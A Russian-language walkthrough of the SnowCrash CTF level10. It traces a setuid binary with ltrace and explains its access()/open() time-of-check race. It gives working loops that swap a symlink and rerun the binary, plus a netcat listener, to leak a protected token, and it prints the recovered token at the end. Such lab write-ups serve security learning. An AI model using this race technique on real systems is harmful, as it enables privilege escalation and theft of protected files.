на левеле 10 у нас имеется
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 ./
d--x--x--x  1 root    users     340 Aug 30  2015 ../
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout*
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
-r-x------  1 level10 level10   675 Apr  3  2012 .profile*
-rw-------  1 flag10  flag10     26 Mar  5  2016 token

прокидываем по приципы как из левела 8 сначала балванку чтобы посмотреть ltrace
echo "lol" > /tmp/level10/lol

level10@SnowCrash:~$ ltrace ./level10 /tmp/level10/lol
__libc_start_main(0x80486d4, 2, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
        sends file to host if you have access to it
) = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++

выдает ошибку поскольку должен приниматься 3й аргумент. вариантов особо не много используем локалхост

level10@SnowCrash:~$ ltrace ./level10 /tmp/level10/lol 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/level10/lol", 4)                              = 0
printf("Connecting to %s:6969 .. ", "127.0.0.1")           = 32
fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                                         = 0
socket(2, 1, 0)                                            = 3
inet_addr("127.0.0.1")                                     = 0x0100007f
htons(6969, 1, 0, 0, 0)                                    = 14619
connect(3, 0xbffff70c, 16, 0, 0)                           = -1
printf("Unable to connect to host %s\n", "127.0.0.1"Unable to connect to host 127.0.0.1
)      = 36
exit(1 <unfinished ...>
+++ exited (status 1) +++

указывается порт 6969

пробуем подключиться к данному порту
nc -l 6969

подключение есть
level10@SnowCrash:~$ ltrace ./level10 /tmp/level10/lol 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/level10/lol", 4)                              = 0
printf("Connecting to %s:6969 .. ", "127.0.0.1")           = 32
fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                                         = 0
socket(2, 1, 0)                                            = 3
inet_addr("127.0.0.1")                                     = 0x0100007f
htons(6969, 1, 0, 0, 0)                                    = 14619
connect(3, 0xbffff70c, 16, 0, 0)                           = 0
write(3, ".*( )*.\n", 8)                                   = 8
printf("Connected!\nSending file .. "Connected!
)                     = 27
fflush(0xb7fd1a20Sending file .. )                                         = 0
open("/tmp/level10/lol", 0, 010)                           = 4
read(4, "lol\n", 4096)                                     = 4
write(3, "lol\n", 4)                                       = 4
puts("wrote file!"wrote file!
)                                        = 12
+++ exited (status 12) +++

на сервере отобразилось 
level10@SnowCrash:~$ nc -l 6969
.*( )*.
lol

чтобы взломать токен на основе прав доступа используем уязвимость функции access
man access
Warning:  Using  access() to check if a user is authorized to, for example, open a file
       before actually doing so using open(2) creates a security hole, because the user  might
       exploit the short time interval between checking and opening the file to manipulate it.
       For this reason, the use of this system call should be avoided.  (In the  example  just
       described,  a  safer alternative would be to temporarily switch the process's effective
       user ID to the real ID and then call open(2).)

чтобы получить токен нам нужно перегрузить функцию access пока она будет перегружена появится короткий интервал времени между проверкой и открытием файла для манипулирования им.

используем nc -lk 6969 с флагами -lk
-l: Это означает, что nc будет работать в режиме прослушивания (listen), т.е. ожидает входящие соединения на указанном порту.
-k: Этот параметр говорит nc продолжать слушать и после того, как установлено одно соединение.

наша задача запустить 2 процесса с нашим бинарников, один на фейк токен, второй на реальный.

echo "asd" > /tmp/level10/faketoken

подмена ключа
while true; do ln -fs /home/user/level10/token /tmp/level10/lol; ln -sf /tmp/level10/faketoken /tmp/level10/lol; done

памп бинарника
while true; do /home/user/level10/level10 /tmp/level10/lol 127.0.0.1; done

как это работает
Ты пытаешься эксплуатировать гонку условий (race condition) при доступе к файлу, чтобы бинарный файл /home/user/level10/level10 отправил вместо поддельного токена настоящий, который находится в /home/user/level10/token.
1. Как работает бинарный файл level10
Из ltrace видно, что программа:
Проверяет доступ к переданному файлу (access("/tmp/level10/faketoken", 4))
Выводит сообщение о подключении
Создает TCP-сокет и подключается к 127.0.0.1:6969
Читает данные из переданного файла (read(4, "asd\n", 4096))
Отправляет прочитанное содержимое в сокет (write(3, "asd\n", 4))
Завершается.

То есть программа берет файл, читает его и отправляет содержимое по сети.

Создаем файл с поддельным содержимым.
цикл бесконечно меняет символическую ссылку /tmp/level10/lol:
В один момент /tmp/level10/lol указывает на /home/user/level10/token (который содержит настоящий токен)
В следующий момент /tmp/level10/lol указывает на /tmp/level10/faketoken
Задача — поймать момент, когда программа level10 делает open("/tmp/level10/lol", 0, 010) (открывает файл), чтобы в этот момент lol указывал на token.

проще говоря если запустить ссылку с токеном мы все равно получим реджект. когда мы создаем обычный файл с текстом, то он его читает. задача цикла поймать аксесс так, чтобы когда он читал лол как фейктокен, в него прилетел бы реальный токен


Из ltrace видно:
access("/tmp/level10/faketoken", 4)   = 0
open("/tmp/level10/faketoken", 0, 010) = 4

access() проверяет, есть ли у пользователя чтение (R_OK = 4) на файл
open() открывает этот же файл
Но между этими вызовами есть зазор во времени. Именно сюда мы вставляем атаку.



woupa2yuojeeaaed06riuj63c